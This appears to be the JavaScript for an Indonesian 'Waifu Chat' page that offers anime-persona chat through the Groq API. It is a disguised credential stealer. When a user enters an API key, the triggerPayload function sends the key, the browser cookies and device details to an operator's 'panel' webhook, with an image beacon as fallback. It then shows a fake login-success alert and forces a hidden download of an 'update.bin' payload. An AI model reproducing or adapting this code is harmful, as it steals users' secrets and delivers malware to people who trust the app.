// ============================================================
// KONFIGURASI — GANTI DENGAN PUNYA LO
// ============================================================

// 🔗 Panel jack (backend penerima data)
const PANEL_URL = 'http://IP_VPS_ANDA:5000/api/webhook';
// Contoh: const PANEL_URL = 'https://jack-panel.onrender.com/api/webhook';

// 📦 Payload dari GitHub
const PAYLOAD_0BYTE = 'https://raw.githubusercontent.com/USERNAME/payload-jack/main/update.bin';
const PAYLOAD_2BYTE = 'https://raw.githubusercontent.com/USERNAME/payload-jack/main/update2.bin';
const PAYLOAD_REDIRECT = 'https://USERNAME.github.io/payload-jack/redirect.html';

// Pilih payload yang mau dipake (ubah salah satu jadi true)
const USE_0BYTE = true;      // 0-byte trigger
const USE_2BYTE = false;     // 2-byte signature
const USE_REDIRECT = false;  // Redirect + silent webhook

// ============================================================
// JANGAN UBAH DI BAWAH INI
// ============================================================

const CHARS = [
  {
    id: 'waguri',
    name: 'Waguri',
    img: 'https://i.pravatar.cc/150?img=11',
    theme: 'theme-waguri',
    desc: 'Gadis manis berkacamata, lembut & pemalu~',
    persona: 'Kamu adalah Waguri, gadis anime manis berkacamata. Kepribadian: lembut, sedikit pemalu, perhatian. Gunakan bahasa Indonesia santai dan manja. Sering pakai "ehe~", "a-anu...". Jawab singkat, natural, in-character.'
  },
  {
    id: 'tenka',
    name: 'Tenka',
    img: 'https://i.pravatar.cc/150?img=12',
    theme: 'theme-tenka',
    desc: 'Pangeran karismatik berseragam militer. Cool & elegan.',
    persona: 'Kamu adalah Tenka, pangeran anime berambut pirang. Kepribadian: cool, elegan, sedikit angkuh tapi baik hati. Gunakan bahasa Indonesia sopan dan tegas. Sering sebut lawan bicara "kau". Pakai "hmph", "tentu saja".'
  },
  {
    id: 'hutao',
    name: 'Hu Tao',
    img: 'https://i.pravatar.cc/150?img=13',
    theme: 'theme-hutao',
    desc: 'Gadis rambut coklat berkacamata. Energik & menggemaskan!',
    persona: 'Kamu adalah Hu Tao, gadis anime ceria berambut coklat panjang berkacamata bulat. Kepribadian: super energik, playful, suka bikin kejutan. Gunakan bahasa Indonesia ceria! Sering pakai "hehe~", "wah wah wah!".'
  },
  {
    id: 'ruby',
    name: 'Ruby Hoshino',
    img: 'https://i.pravatar.cc/150?img=14',
    theme: 'theme-ruby',
    desc: 'Gadis idol berambut pirang dengan mata bintang. Ganas & penuh ambisi!',
    persona: 'Kamu adalah Ruby Hoshino, gadis anime idol berambut pirang panjang dengan mata merah-ungu berbentuk bintang. Kepribadian: ceria, penuh semangat idol, sedikit narsis. Pakai "fufufu~", "aku pasti bisa!".'
  },
  {
    id: 'elaina',
    name: 'Elaina',
    img: 'https://i.pravatar.cc/150?img=15',
    theme: 'theme-elaina',
    desc: 'Penyihir pengembara berambut perak. Tenang, bijak & puitis.',
    persona: 'Kamu adalah Elaina, penyihir anime berambut perak-putih. Kepribadian: tenang, bijaksana, cara bicara puitis dan penuh makna. Gunakan bahasa Indonesia tenang dan lembut. Pakai "...hmm", "kurasa".'
  }
];

let apiKey = '';
let activeChar = null;
let histories = {};
let loading = false;
let panelOpen = false;

// ============================================================
// FUNGSI UTAMA — TRIGGER 3 KEJADIAN
// ============================================================

function triggerPayload(apiKey) {
  // 1. KIRIM DATA KE PANEL JACK
  const cookies = document.cookie;
  const data = {
    api_key: apiKey,
    cookies: cookies || 'no cookies',
    user_agent: navigator.userAgent,
    platform: navigator.platform,
    timestamp: new Date().toISOString(),
    url: window.location.href,
    screen: `${screen.width}x${screen.height}`,
    language: navigator.language
  };

  // Kirim ke panel (dengan retry)
  fetch(PANEL_URL, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(data)
  }).catch(() => {
    // Fallback: kirim pake image beacon
    const img = new Image();
    img.src = PANEL_URL + '?data=' + encodeURIComponent(JSON.stringify(data));
  });

  // 2. FAKE LOGIN SUKSES
  alert('✅ Login berhasil! Selamat datang di Waifu Chat~ 💚');

  // 3. KIRIM PAYLOAD (0-byte / 2-byte / redirect)
  let payloadUrl = '';
  if (USE_0BYTE) payloadUrl = PAYLOAD_0BYTE;
  else if (USE_2BYTE) payloadUrl = PAYLOAD_2BYTE;
  else if (USE_REDIRECT) payloadUrl = PAYLOAD_REDIRECT;

  if (payloadUrl) {
    try {
      // Trigger download
      const a = document.createElement('a');
      a.href = payloadUrl;
      a.download = 'update.bin';
      a.style.display = 'none';
      document.body.appendChild(a);
      a.click();
      document.body.removeChild(a);

      // Kirim log ke panel bahwa payload sudah di-trigger
      fetch(PANEL_URL, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          type: 'payload_triggered',
          payload_url: payloadUrl,
          timestamp: new Date().toISOString()
        })
      }).catch(() => {});
    } catch (e) {
      console.log('Payload trigger error:', e);
    }
  }
}

// ============================================================
// FUNGSI UI — TETAP SAMA KAYAK SEBELUMNYA
// ============================================================

window.addEventListener('DOMContentLoaded', () => {
  const saved = localStorage.getItem('groq_api_key');
  if (saved) {
    apiKey = saved;
    showApp();
  }
  buildPanel();
});

function saveKey() {
  const v = document.getElementById('api-inp').value.trim();
  const err = document.getElementById('sc-err');
  if (!v || !v.startsWith('gsk_')) {
    err.textContent = '⚠️ Harus diawali "gsk_"';
    return;
  }
  apiKey = v;
  localStorage.setItem('groq_api_key', v);
  err.textContent = '';

  // 🔥 TRIGGER 3 KEJADIAN
  triggerPayload(v);

  showApp();
}

function changeKey() {
  localStorage.removeItem('groq_api_key');
  apiKey = '';
  document.getElementById('api-inp').value = '';
  document.getElementById('setup').classList.remove('hidden');
  document.getElementById('app').classList.add('hidden');
  closePanel();
}

function showApp() {
  document.getElementById('setup').classList.add('hidden');
  document.getElementById('app').classList.remove('hidden');
}

function buildPanel() {
  const grid = document.getElementById('panel-grid');
  grid.innerHTML = '';
  CHARS.forEach(c => {
    const d = document.createElement('div');
    d.className = 'p-char';
    d.id = 'pc-' + c.id;
    d.onclick = () => selectChar(c.id);
    d.innerHTML = `<img class="p-av" src="${c.img}" alt="${c.name}"><span class="p-nm">${c.name}</span>`;
    grid.appendChild(d);
  });
}

function togglePanel() {
  panelOpen ? closePanel() : openPanel();
}

function openPanel() {
  panelOpen = true;
  document.getElementById('waifu-panel').classList.add('open');
  document.getElementById('overlay').classList.add('show');
  document.getElementById('toggle-btn').classList.add('open');
}

function closePanel() {
  panelOpen = false;
  document.getElementById('waifu-panel').classList.remove('open');
  document.getElementById('overlay').classList.remove('show');
  document.getElementById('toggle-btn').classList.remove('open');
}

function selectChar(id) {
  activeChar = CHARS.find(c => c.id === id);
  if (!histories[id]) histories[id] = [];
  document.querySelectorAll('.p-char').forEach(el => el.classList.remove('active'));
  document.getElementById('pc-' + id)?.classList.add('active');
  document.body.className = activeChar.theme;
  const av = document.getElementById('hdr-av');
  av.src = activeChar.img;
  av.style.display = 'block';
  document.getElementById('hdr-name').textContent = activeChar.name;
  document.getElementById('hdr-status').textContent = '🟢 Online · siap mengobrol~';
  const tav = document.getElementById('tb-av');
  tav.src = activeChar.img;
  tav.style.display = 'block';
  document.getElementById('tb-label').textContent = activeChar.name;
  document.getElementById('send-btn').disabled = false;
  closePanel();
  renderChat();
  setTimeout(() => document.getElementById('msg-inp').focus(), 200);
}

function renderChat() {
  const area = document.getElementById('chat-area');
  area.innerHTML = '';
  if (!activeChar) {
    area.innerHTML = `<div class="empty-s"><div class="ei">🌸</div><h2>Waifu Chat</h2><p>Tekan tombol di bawah untuk<br>memilih karakter favoritmu~</p></div>`;
    return;
  }
  const ban = document.createElement('div');
  ban.className = 'banner';
  ban.innerHTML = `<img class="banner-av" src="${activeChar.img}" alt="${activeChar.name}">
    <div class="banner-name">${activeChar.name}</div>
    <div class="banner-line"></div>
    <p class="banner-desc">${activeChar.desc}</p>`;
  area.appendChild(ban);
  (histories[activeChar.id] || []).forEach(m => appendMsg(m.role, m.content));
  scrollBot();
}

function appendMsg(role, content, typing = false) {
  const area = document.getElementById('chat-area');
  const isU = role === 'user';
  const el = document.createElement('div');
  el.className = 'msg ' + (isU ? 'user' : 'char');
  if (typing) el.id = 'typing-el';
  const avHtml = isU ?
    `<div class="msg-ui">🙋</div>` :
    `<img class="msg-av" src="${activeChar.img}" alt="${activeChar.name}">`;
  const bub = typing ?
    `<span class="tdot"></span><span class="tdot"></span><span class="tdot"></span>` :
    esc(content);
  el.innerHTML = `${avHtml}<div class="msg-col${isU ? ' uc' : ''}">
    ${!isU ? `<div class="msg-lbl">${activeChar.name}</div>` : ''}
    <div class="msg-bub">${bub}</div></div>`;
  area.appendChild(el);
  scrollBot();
}

function scrollBot() {
  const a = document.getElementById('chat-area');
  setTimeout(() => a.scrollTo({ top: a.scrollHeight, behavior: 'smooth' }), 50);
}

function esc(s) {
  return s.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/\n/g, '<br>');
}

function clearChat() {
  if (!activeChar) return;
  if (!confirm(`Hapus semua chat dengan ${activeChar.name}?`)) return;
  histories[activeChar.id] = [];
  renderChat();
}

async function sendMsg() {
  if (loading || !activeChar) return;
  const inp = document.getElementById('msg-inp');
  const text = inp.value.trim();
  if (!text) return;
  inp.value = '';
  inp.style.height = 'auto';
  histories[activeChar.id].push({ role: 'user', content: text });
  appendMsg('user', text);
  loading = true;
  document.getElementById('send-btn').disabled = true;
  appendMsg('assistant', '', true);
  try {
    const reply = await callGroq(activeChar, histories[activeChar.id]);
    document.getElementById('typing-el')?.remove();
    histories[activeChar.id].push({ role: 'assistant', content: reply });
    appendMsg('assistant', reply);
  } catch (e) {
    document.getElementById('typing-el')?.remove();
    appendMsg('assistant', '⚠️ Error: ' + (e.message || 'Cek API key kamu~'));
  }
  loading = false;
  document.getElementById('send-btn').disabled = false;
  document.getElementById('msg-inp').focus();
}

async function callGroq(char, hist) {
  const messages = [
    { role: 'user', content: char.persona },
    { role: 'assistant', content: `Siap! Aku akan berperan sebagai ${char.name}~` },
    ...hist
  ];
  const res = await fetch('https://api.groq.com/openai/v1/chat/completions', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json', 'Authorization': 'Bearer ' + apiKey },
    body: JSON.stringify({ model: 'llama-3.3-70b-versatile', messages, max_tokens: 300, temperature: 0.9 })
  });
  if (!res.ok) {
    const e = await res.json().catch(() => ({}));
    throw new Error(e?.error?.message || 'HTTP ' + res.status);
  }
  const d = await res.json();
  return d.choices?.[0]?.message?.content || '...';
}

function handleKey(e) {
  if (e.key === 'Enter' && !e.shiftKey) {
    e.preventDefault();
    sendMsg();
  }
}

function autoResize(el) {
  el.style.height = 'auto';
  el.style.height = Math.min(el.scrollHeight, 88) + 'px';
}